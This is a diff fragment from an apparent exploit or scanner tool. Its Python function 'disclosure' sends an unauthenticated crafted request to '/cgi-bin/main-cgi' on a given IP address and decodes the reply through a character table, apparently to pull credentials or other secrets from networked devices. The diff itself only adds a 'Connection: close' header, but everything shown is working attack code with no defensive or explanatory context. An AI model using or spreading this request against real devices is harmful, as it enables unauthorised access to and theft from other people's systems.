@@ -26,7 +26,7 @@ def disclosure(ip: str) -> list:
             if char != "124" and char != "0": decoded.append(code_table[char])
         return ''.join(decoded)
 
-    headers = {'User-Agent': config.USERAGENT}
+    headers = {'Connection': 'close', 'User-Agent': config.USERAGENT}
     url = f"http://{ip}" + '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"'
     try:
         r = requests.get(url, headers=headers, verify=False, timeout=config.TIMEOUT)
